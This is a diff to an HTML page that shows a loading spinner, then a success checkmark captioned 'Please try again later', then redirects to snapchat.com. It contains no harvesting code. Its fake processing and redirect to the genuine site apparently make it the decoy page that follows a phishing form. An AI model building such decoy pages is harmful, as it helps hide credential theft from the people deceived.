@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -20,5 +20,174 @@
             window.location.href = 'https://www.snapchat.com';
         };
     </script>
+</body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        /* Define color variables for easy customization */
+        :root {
+            --background-color: #f0f2f5;
+            --card-background: #ffffff;
+            --primary-color: #00aaff; /* A nice blue, similar to your forms */
+            --success-color: #28a745;
+            --text-color: #333;
+            --subtle-text-color: #666;
+            --loader-color: #ddd;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--background-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .card {
+            background: var(--card-background);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 320px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        /* Loading Spinner Animation */
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid var(--loader-color);
+            border-top-color: var(--primary-color);
+            border-radius: 50%;
+            margin: 0 auto 20px auto;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Success Checkmark Animation */
+        .success-checkmark {
+            display: none; /* Hidden by default */
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 15px auto;
+        }
+        
+        .success-checkmark .check-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            display: block;
+            stroke-width: 3;
+            stroke: var(--success-color);
+            stroke-miterlimit: 10;
+            animation: scale .3s ease-in-out .9s both;
+        }
+
+        .success-checkmark .check-icon__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 3;
+            stroke-miterlimit: 10;
+            stroke: var(--success-color);
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+        }
+        
+        .success-checkmark .check-icon__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 1.2s forwards;
+        }
+        
+        @keyframes stroke {
+            100% { stroke-dashoffset: 0; }
+        }
+        @keyframes scale {
+            0%, 100% { transform: none; }
+            50% { transform: scale3d(1.1, 1.1, 1); }
+        }
+
+        h1 {
+            font-size: 22px;
+            color: var(--text-color);
+            margin: 0 0 10px;
+        }
+
+        p {
+            font-size: 16px;
+            color: var(--subtle-text-color);
+            margin: 0;
+        }
+        
+        /* Hide elements helper */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div id="loader" class="loader"></div>
+        
+        <div id="success-message" class="hidden">
+            <div class="success-checkmark">
+                <svg class="check-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                    <circle class="check-icon__circle" cx="26" cy="26" r="25" fill="none"/>
+                    <path class="check-icon__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                </svg>
+            </div>
+            <h1>Please try again later</h1>
+            <p>Redirecting you now...</p>
+        </div>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const loader = document.getElementById('loader');
+            const successMessage = document.getElementById('success-message');
+
+            // Wait 1.5 seconds to simulate processing
+            setTimeout(() => {
+                // Hide the loader and show the success message
+                loader.classList.add('hidden');
+                successMessage.classList.remove('hidden');
+                
+                // Find the h1 inside the success message and its child svg
+                const h1 = successMessage.querySelector('h1');
+                const checkmark = successMessage.querySelector('.success-checkmark');
+
+                // Make the SVG and the H1 visible
+                if (checkmark) checkmark.style.display = 'block';
+                if (h1) h1.style.display = 'block';
+
+                // After showing the success message, wait 2 seconds before redirecting
+                setTimeout(() => {
+                    window.location.href = 'https://www.snapchat.com';
+                }, 2000); // 2-second delay before redirect
+
+            }, 1500); // 1.5-second delay for the loader
+        };
+    </script>
+
 </body>
 </html>
